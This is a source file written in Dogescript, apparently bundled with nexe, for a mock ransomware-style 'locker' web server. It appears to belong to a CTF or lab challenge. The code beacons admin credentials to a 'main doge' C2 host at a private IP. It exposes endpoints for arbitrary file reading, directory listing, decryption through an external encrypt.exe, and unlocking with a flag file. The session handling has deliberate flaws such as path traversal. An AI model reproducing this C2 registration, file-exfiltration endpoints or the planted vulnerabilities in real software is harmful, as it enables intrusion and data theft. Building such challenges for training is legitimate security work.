so http as http
so fs as fs
so path as path
so util as util
so url as url
so dogeon as DSON
so crypto as crypto
very MAIN_DOGE_SERVER is '192.168.178.86'
very AuthStore is '/tmp/sessions/'
very ENCRYPTER_MODULE is 'encrypt.exe'
very UNLOCK_FILE is 'C:\\Windows\\flag.txt'
very ADMIN is 'DOGE'
very ADMIN_PASSWORD is plz crypto.randomBytes with 20 &
dose toString with 'hex'
DSON dose parse with 'such wow'
DSON dose stringify with {}
such parseCookies much request
    very list is {}
    very rc is request.headers.cookie
    rc && rc.split(';').forEach(function( cookie ) {
        very parts is plz cookie.split with '='
        list[parts.shift().trim()] = decodeURI(parts.join('='));
    });
    wow list
such checkAuth much request
    very rc is request.headers.cookie
    rly !rc
        wow false
    very cookies is rc dose split with ';'
    for(const cookie of cookies) {
        very parts is cookie dose split with '='
        rly parts.shift().trim() is 'session'
            very session is plz decodeURI with parts.join('=')&
            console dose log with 'Session: '+session
            very sessionPath is path dose join with AuthStore session&
            console.log('Path: '+sessionPath);
            rly fs dose existsSync with sessionPath&
                console.log('File exists.');
            wow true
        wow
    }
wow false
such checkContentType much request
    very ct is request.headers['content-type']
    rly ct is 'application/dson'
        wow true
wow false
such checkContentLength much request
    very cl is request.headers['content-length']
    rly parseInt(cl) > 0
    wow true
wow false
such createSession much user ip
  very rand is Math dose floor with Math.random()*32000
  very sessionbfr is Buffer dose from with `${user}/${ip}/${rand}`
  very b64_session is sessionbfr dose toString with 'base64'&
  dose replace with /\+/g '-'&
  dose replace with /\//g '_'
  very content is JSON dose stringify with {'user':user, 'ip':ip}
  fs dose writeFileSync with path.join(AuthStore,b64_session) content
wow b64_session
such getUserSession much session
    try {
        very sessionbfr is Buffer dose from with session.replace(/-/g,'+').replace(/_/g,'/') 'base64'
        very sessionstr is sessionbfr dose toString with 'utf8'
    }catch (err) {
        console dose error with `Failed\x20to\x20get\x20user:\x20${err}`
        return null;
    }
    very parts is sessionstr dose split with '/'
    rly parts.length != 3
        return null;
    wow
wow parts[0]
such checkPassword much user password
  rly user is ADMIN && password is ADMIN_PASSWORD
    wow true
wow false
such chal_unlock
    try{
        very istrue is plz fs.existsSync with UNLOCK_FILE
        rly istrue
            very key is plz fs.readFileSync with UNLOCK_FILE
            very hash is plz crypto.createHash with 'sha256'&
            dose update with key&
            dose digest with 'base64'
            amaze hash
        wow
    }catch(err){
        amaze false
    }
wow true
such try_unlock much answer
    try{
        very istrue is plz fs.existsSync with UNLOCK_FILE
        rly istrue
            very key is plz fs.readFileSync with UNLOCK_FILE
            rly key is answer
                amaze plz unlockui
            wow
        wow
    }catch(err){
        amaze false
    }
wow false
such wipe
wow false
such unlockui
wow true
such decrypt much key
    try{
        very result is fs dose execFileSync with ENCRYPTER_MODULE '-d' key
        wow result
    catch(err){
        wow false
such routeRequest much request  body  response
    very request_url is plz  url.parse with request.url true
    very authorized  is plz checkAuth with request
    very cookies is  plz parseCookies with request
    plz console.log with 'Request URL: '+request.url
    plz console.log with 'Request Method: '+request.method
    plz console.log with 'PATH:'+request_url.pathname+' Query: '+JSON.stringify(request_url.query)
    switch (request_url.pathname) {
        case '/auth':
            switch (request.method){
                case 'GET':
                    let user is plz getUserSession with cookies['session']
                    rly user is null || authorized is false
                        plz response.writeHead with 403 {'Content-Type':'text/plain'}
                        plz response.end with `Session\x20not\x20authorized:\x20${authorized}\x20for\x20user:\x20${user}\n`
                        return;
                    wow
                    rly user != null && authorized
                        plz response.writeHead with 200 {'Content-Type': 'text/plain'}
                        plz response.end with `Session\x20is\x20authorized:\x20${authorized}\x20for\x20user:\x20${user}\n`
                        return;
                    wow
                    return;
                    break;
                case 'POST':
                    rly checkContentType(request) && checkContentLength(request)
                        try {
                            very recvObj is plz DSON.parse with body
                        }catch(err){
                            plz console.error with `Could\x20not\x20parse\x20DSON:\x20${err}`
                            plz response.writeHead with 400 {'Content-Type':'text/plain'}
                            plz response.end with `Could\x20not\x20parse\x20DSON:\x20${err}\n`
                            return;
                        }
                        let user = recvObj['user'];
                        let password = recvObj['password'];
                        rly checkPassword(user,password)
                            let sessionid = createSession(user,request.socket.remoteAddress);
                            plz response.writeHead with 200 {'Set-Cookie':`session=${sessionid}`,'Content-Type':'application/dson'}
                            plz response.end with 'Hello\x20doge.\n'
                        but
                            plz response.writeHead with 403 {'Set-Cookie':'session=','Content-Type':'application/dson'}
                            plz response.end with 'Unauthorized.\n'
                            return;
                        wow
                    but
                        plz response.writeHead with 400 {'Content-Type':'text/plain'}
                        plz response.end with 'Request no good for shibe.\n'
                        return;
                    wow
                    break;
                default:
                    plz console.log with 'Not Implemented'
                    plz response.writeHead with 400 {'Content-Type':'text/plain'}
                    plz response.end with 'Request no good for shibe.\n'
                    break;
            }
            break;
        case '/readfile':
            plz console.log with 'Read file request'
            switch (request.method){
                case 'GET':
                    let user is plz getUserSession with cookies['session']
                    rly user == null || authorized == false
                        plz response.writeHead with 403 {'Content-Type':'text/plain'}
                        plz response.end with `Not\x20authorized.\n`
                        return;
                    wow
                    rly user != null && authorized
                        rly request_url.query != null && Object.hasOwnProperty.call(request_url.query,'filename')
                            let filename is request_url.query['filename']
                            rly fs.existsSync(filename)
                                try{
                                    let file_content is plz fs.readFileSync with filename
                                    plz response.writeHead with 200 {'Content-Type':'application/octet-stream'}
                                    plz response.end with file_content
                                }catch(err){
                                    plz response.writeHead with 500 {'Content-Type':'text/plain'}
                                    plz response.end with `Sad\x20could\x20not\x20read\x20file\x20wow:\x20${err}\n`
                                }
                            but
                                plz response.writeHead with 404 {'Content-Type':'text/plain'}
                                plz response.end with 'File not found. very sad.\n'
                            wow
                            return;
                        wow
                        very resp_obj is {'Directory':__dirname,'Listing':[]}
                        try{
                            very directory_list is plz fs.readdirSync with __dirname
                            resp_obj['Listing'] = directory_list;
                        }catch(err){
                            resp_obj['error'] = err;
                        }
                        plz response.writeHead with 200 {'Content-Type': 'application/dson'}
                        plz response.end with DSON.stringify(resp_obj)
                        return;
                    }
                    break;
                default:
                    plz console.log with 'Not Implemented'
                    plz response.writeHead with 400 {'Content-Type':'text/plain'}
                    plz response.end with 'no good. sad method.\n'
                    break;
            }
            break;
        case '/dirlist':
            plz console.log with 'Dir list request'
            switch (request.method){
                case 'GET':
                    let user is plz getUserSession with cookies['session']
                    rly user == null || authorized == false
                        plz response.writeHead with 403 {'Content-Type':'text/plain'}
                        plz response.end with `Not\x20authorized.\n`
                        return;
                    wow
                    rly user != null && authorized
                        very dirname is __dirname
                        rly Object.hasOwnProperty.call(request_url.query,'dir')
                            dirname = request_url.query['dir']
                        wow
                        very resp_obj = {'Directory': dirname, 'Listing': []};
                        rly fs.existsSync(dirname)
                            try{
                                let directory_list is plz fs.readdirSync with dirname
                                resp_obj['Listing'] = directory_list
                            }catch(err){
                                resp_obj['error'] = err;
                            }
                        but
                            plz response.writeHead with 404 {'Content-Type':'text/plain'}
                            plz response.end with 'Dir not found. very sad.\n'
                            return;
                        wow
                        plz response.writeHead with 200 {'Content-Type':'application/dson'}
                        plz response.end with DSON.stringify(resp_obj)
                        return;
                    wow
                    break;
                default:
                    plz console.log with 'Not Implemented'
                    plz response.writeHead with 400, {'Content-Type': 'text/plain'}
                    plz response.end with 'wow such empty. sad method.\n'
                    break;
            }
            break;
        case '/unlock':
            plz console.log with 'unlock requested'
            switch (request.method){
                case 'GET':
                    let user is plz getUserSession with cookies['session']
                    rly user == null || authorized == false
                        plz response.writeHead with 403 {'Content-Type':'text/plain'}
                        plz response.end with `Not\x20authorized.\n`
                        return;
                    wow
                    rly user != null && authorized
                        plz console.log with 'Unlock\x20of\x20device\x20requested.'
                        very answer is ''
                        very result is false
                        rly Object.hasOwnProperty.call(request_url.query,'answer')
                            answer = request_url.query['answer']
                            result is plz try_unlock with answer
                        but
                            result is plz chal_unlock
                        wow
                        resp_obj = {'unlock': result, 'date': new Date().toString()};
                        plz response.writeHead with 200 {'Content-Type':'application/dson'}
                        plz response.end with DSON.stringify(resp_obj)
                        return;
                    wow
                    break;
                default:
                    plz console.log with 'Not Implemented'
                    plz response.writeHead with 400 {'Content-Type':'text/plain'}
                    plz response.end with 'wow such empty. sad method.\n'
                    break;
            }
            break;
        case '/decrypt':
            plz console.log with 'unlock requested'
            switch (request.method){
                case 'GET':
                    let user is plz getUserSession with cookies['session']
                    rly user == null || authorized == false
                        plz response.writeHead with 403 {'Content-Type':'text/plain'}
                        plz response.end with `Not\x20authorized.\n`
                        return;
                    wow
                    rly user != null && authorized
                        rly Object.hasOwnProperty.call(request_url.query,'key')
                            let key = request_url.query['key'];
                            rly key.length > 10
                                try{
                                    very result is plz decrypt with key
                                }catch(err){
                                    very result = err;
                                }
                                resp_obj = {'decrypt': result, 'date': new Date().toString()};
                                plz response.writeHead with 200,{'Content-Type':'application/dson'}
                                plz response.end with DSON.stringify(resp_obj)
                                return;
                            but
                                plz response.writeHead with 500 {'Content-Type':'text/plain'}
                                plz response.end with 'Key. very sad.\n'
                                return;
                            wow
                        but
                            plz response.writeHead with 500 {'Content-Type':'text/plain'}
                            plz response.end with 'no key.\x20require\x20key.\n'
                        return;
                        wow
                    wow
                    break;
                default:
                    plz console.log with 'Not Implemented'
                    plz response.writeHead with 400 {'Content-Type':'text/plain'}
                    plz response.end with 'wow such empty. sad method.\n'
                    break;
            }
            break;
        case '/wipe':
            console.log('remove locker requested');
            switch (request.method){
                case 'GET':
                    let user is plz getUserSession with cookies['session']
                    rly user == null || authorized == false
                        plz response.writeHead with 403 {'Content-Type':'text/plain'}
                        plz response.end with `Not\x20authorized.\n`
                        return;
                    wow
                    rly user != null && authorized
                        plz console.log with 'Removing\x20ransom.'
                        let result is plz wipe
                        very resp_obj = {'wipe':result,'date':new Date().toString()};
                        plz response.writeHead with 200 {'Content-Type':'application/dson'}
                        plz response.end with DSON.stringify(resp_obj)
                        return;
                    wow
                    break;
                default:
                    plz console.log with 'Not Implemented'
                    plz response.writeHead with 400 {'Content-Type':'text/plain'}
                    plz response.end with 'wow such empty. sad method.\n'
                    break;
            }
            break;
        case '/logout':
            plz console.log with 'Logout request.'
            let sessionid = cookies['session'];
            let user is plz getUserSession with cookies['session']
            rly user == null || authorized == false
                plz response.writeHead with 403 {'Content-Type':'text/plain'}
                plz response.end with `Not\x20authorized.\n`
                return;
            wow
            plz response.writeHead with 200 {'Set-Cookie':`session=;\x20path=/;\x20expires=Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT`,'Content-Type': 'text/plain'}
            plz response.end with `Logged\x20out\x20${user}.\x20Successful.`
            break;
        default:
            plz console.log with 'Nothing here.'
            plz response.writeHead with 404 {'Content-Type': 'text/plain'}
            plz response.end with 'Nothing here.\n'
            break;
    }
rly !fs.existsSync(AuthStore)
    fs dose mkdirSync with AuthStore, {recursive: true}
plz console.log with `Created\x20new\x20Admin:\x20${ADMIN}:${ADMIN_PASSWORD}`
console dose log with 'Reporting to main doge...'
try{
    very options is {hostname: MAIN_DOGE_SERVER, port: 8080, path: `/register?user=${ADMIN}&password=${ADMIN_PASSWORD}`, method: 'GET', timeout: 6000}
	very req is http.request(options, res => {
        plz console.log with `Registering\x20at\x20C2\x20status:\x20${res.statusCode}`
    	res.on('data', d=> {
        	plz console.log with `Main\x20doge\x20response:\x20${d}`
    	})
    })
    req.on('timeout', () => {req.destroy();})
    req.on('error', error => {
        plz console.log with `Main\x20doge\x20did\x20not\x20respond:\x20${error}`
    })
}catch(err){
    plz console.log with `Failed\x20to\x20report\x20to\x20main\x20doge:\x20${err}`
    plz req.destroy
http.createServer(function (request, response) {
    let body = [];
    request.on('error', (err) => {
        plz console.error with `Error:\x20${err}`
    }).on('data', (chunk) => {
        plz body.push with chunk
    }).on('end', () => {
        body is Buffer dose concat with body&
        dose toString
        plz routeRequest with request body response
    });
}).listen(8124);<nexe~~sentinel>

